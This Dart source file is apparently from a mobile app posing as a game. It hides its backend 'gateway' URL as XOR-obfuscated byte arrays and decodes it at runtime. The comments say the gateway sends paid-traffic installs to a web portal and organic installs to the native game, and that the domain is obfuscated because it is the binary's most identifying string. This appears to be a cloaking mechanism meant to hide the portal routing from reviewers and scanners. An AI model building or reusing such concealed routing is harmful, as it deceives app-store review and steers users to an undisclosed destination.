import '../core/cipher.dart';

// ============================================================
// GATEWAY SECRETS — obfuscated config endpoint
// ============================================================
// The gateway is the backend that decides, per install, whether a
// user lands in the web portal (paid traffic) or the native game
// (organic). Its domain is the single most identifying string in the
// binary, so it lives here as a position-mixed XOR blob, never as a
// readable literal.
//
// Regenerate after a seed change:
//   dart run tool/seed_pack.dart
// then paste the printed "gateway host" / "gateway path" arrays below.
// ============================================================

// "https://wiingsprint.com"
const List<int> _host = [
  87, 172, 156, 123, 17, 89, 44, 166, 7, 109, 37, 200,
  62, 112, 122, 166, 174, 186, 67, 237, 72, 163, 145,
];

// "/config.php"
const List<int> _path = [16, 187, 135, 101, 4, 10, 100, 167, 0, 108, 60];

/// Full POST endpoint that returns the routing verdict
/// `{ok, url, expires, message}`.
String revealGatewayUrl() => reveal(_host) + reveal(_path);
